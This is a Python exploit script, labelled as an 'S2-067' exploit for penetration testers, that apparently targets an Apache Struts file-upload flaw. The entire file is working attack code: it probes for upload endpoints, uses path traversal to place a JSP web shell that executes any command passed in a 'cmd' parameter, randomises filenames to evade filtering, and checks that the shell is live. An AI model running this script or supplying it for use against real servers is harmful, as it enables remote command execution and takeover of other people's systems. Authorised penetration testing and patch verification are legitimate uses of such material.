import requests
import argparse
from urllib.parse import urljoin
from requests_toolbelt.multipart.encoder import MultipartEncoder
import random
import string

def generate_random_filename(extension=".jsp"):
    """
    Generate a random filename to evade simple file filtering.
    """
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + extension

def create_payload():
    """
    Create a simple JSP payload for RCE testing.
    """
    return """<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = in.readLine()) != null) {
            out.println(line);
        }
    }
%>"""

def upload_payload(target_url, upload_endpoint, payload, malicious_filename, paths):
    """
    Attempt to upload the payload to the server with path traversal testing.
    """
    upload_url = urljoin(target_url, upload_endpoint)
    print(f"[INFO] Target upload endpoint: {upload_url}")

    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
        "Connection": "close"
    }

    results = []
    for path in paths:
        print(f"[INFO] Testing path: {path}")
        upload_path = f"{path}/{malicious_filename}"

        # Construct multipart form-data with path traversal
        files = {
            "Upload": (malicious_filename, payload, "application/octet-stream"),
            "uploadFileName": upload_path
        }
        boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        m = MultipartEncoder(fields=files, boundary=boundary)
        headers["Content-Type"] = m.content_type

        try:
            response = requests.post(upload_url, headers=headers, data=m, timeout=10)
            if response.status_code == 200:
                print(f"[SUCCESS] File uploaded to {upload_path}")
                results.append((path, True))
                verify_uploaded_file(target_url, path, malicious_filename)
            else:
                print(f"[ERROR] Upload failed for path: {path}. HTTP Status: {response.status_code}")
                results.append((path, False))
        except requests.RequestException as e:
            print(f"[ERROR] Upload failed for path: {path}. Exception: {e}")
            results.append((path, False))

    return results

def verify_uploaded_file(target_url, path, malicious_filename):
    """
    Verify if the uploaded payload is accessible and can execute commands.
    """
    file_url = urljoin(target_url, f"{path}/{malicious_filename}")
    print(f"[INFO] Verifying file at: {file_url}")

    try:
        response = requests.get(file_url, timeout=10)
        if response.status_code == 200 and "cmd" in response.text:
            print(f"[ALERT] Exploit successful! Webshell available at: {file_url}?cmd=<COMMAND>")
            return True
        elif response.status_code == 404:
            print(f"[INFO] File not found at {file_url}")
        else:
            print(f"[INFO] Unexpected response. HTTP Status: {response.status_code}")
        return False
    except requests.RequestException as e:
        print(f"[ERROR] Verification failed: {e}")
        return False

def discover_upload_endpoint(target_url):
    """
    Attempt to discover common upload endpoints dynamically.
    """
    print("[INFO] Discovering potential upload endpoints...")
    common_endpoints = [
        "/fileUpload.action",
        "/upload.action",
        "/upload",
        "/struts2-showcase/fileUpload.action",
        "/vulnerabilities/upload"
    ]

    for endpoint in common_endpoints:
        full_url = urljoin(target_url, endpoint)
        try:
            response = requests.options(full_url, timeout=5)
            if response.status_code in [200, 403]:
                print(f"[INFO] Potential upload endpoint found: {endpoint}")
                return endpoint
        except requests.RequestException:
            continue
    print("[WARNING] No upload endpoints discovered.")
    return None

def main():
    parser = argparse.ArgumentParser(description="Advanced S2-067 Exploit Script for PT Experts")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., http://example.com)")
    parser.add_argument("--upload_endpoint", help="Path to file upload endpoint (e.g., /upload.action)")
    parser.add_argument("--paths", nargs="+", default=["../../..", "../webapps/ROOT"], help="Custom paths for path traversal testing")
    parser.add_argument("--malicious_filename", default=generate_random_filename(), help="Custom filename for payload")
    parser.add_argument("--payload", default=create_payload(), help="Custom payload content")
    args = parser.parse_args()

    print("[INFO] Starting S2-067 Exploit...")
    target_url = args.url.rstrip("/")

    # Discover upload endpoint if not provided
    upload_endpoint = args.upload_endpoint
    if not upload_endpoint:
        upload_endpoint = discover_upload_endpoint(target_url)
        if not upload_endpoint:
            print("[ERROR] Failed to discover upload endpoint. Exiting.")
            return

    # Upload the payload and test each path
    results = upload_payload(target_url, upload_endpoint, args.payload, args.malicious_filename, args.paths)
    print("\n[RESULTS]")
    for path, status in results:
        status_msg = "Success" if status else "Failed"
        print(f"Path: {path} | Status: {status_msg}")

    print("[INFO] Exploit process completed.")

if __name__ == "__main__":
    main()
